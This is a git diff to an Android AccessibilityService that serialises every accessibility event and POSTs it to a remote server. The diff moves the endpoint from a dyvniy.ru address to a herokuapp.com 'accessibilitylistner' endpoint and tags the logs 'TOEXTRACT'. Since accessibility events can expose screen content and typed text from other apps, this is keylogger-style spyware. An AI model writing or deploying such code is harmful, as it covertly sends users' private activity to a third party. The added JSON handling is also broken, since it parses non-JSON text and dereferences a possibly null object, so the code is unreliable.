@@ -12,9 +12,14 @@ import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.Response;
 import com.android.volley.VolleyError;
+import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.StreamCorruptedException;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,7 +29,7 @@ public class MyAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         Log.e(TAG, "UtsustestonAccessibilityEvent: ");
-        Log.e(TAG, "UtsustestonAccessibilityTest:"+event);
+        Log.e(TAG, "TOEXTRACT:"+event);
 
         String t = event.toString();
 
@@ -32,23 +37,42 @@ public class MyAccessibilityService extends AccessibilityService {
 
 
 
-    String url = "http://dyvniy.ru:9000/api";
+
+    String url = "https://accessibilitylistner.herokuapp.com/api";
         RequestQueue queue = Volley.newRequestQueue(MyAccessibilityService.this);
-        StringRequest sr = new StringRequest(Request.Method.POST,url, new Response.Listener<String>() {
+        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
+                (Request.Method.POST,
+                        url,
+                        null,
+                        new Response.Listener<JSONObject>() {
             @Override
-            public void onResponse(String response) {
-                Log.e(TAG,"OK");
+            public void onResponse(JSONObject response) {
+                Log.e(TAG,"suc");
+                Log.e(TAG,"nope"+response);
+
             }
         }, new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
                 Log.e(TAG,"nope"+error);
+
             }
         }){
             @Override
-            protected Map<String,String> getParams(){
-                Map<String,String> params = new HashMap<String, String>();
-                params.put("evt",event.toString());
+            protected Map<String,String> getParams() {
+                Map<String, String> params = new HashMap<String, String>();
+
+                String c = null;
+                c = event.toString();
+
+                JSONObject d = null;
+                try {
+                    d = new JSONObject(c);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                Log.e(TAG, "" + c);
+                final String evt = params.put("evt", d.toString());
 
 
                 return params;
@@ -61,7 +85,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 return params;
             }
         };
-        queue.add(sr);
+        queue.add(jsonObjectRequest);
 
         String packageName = event.getPackageName().toString();
         PackageManager packageManager = this.getPackageManager();
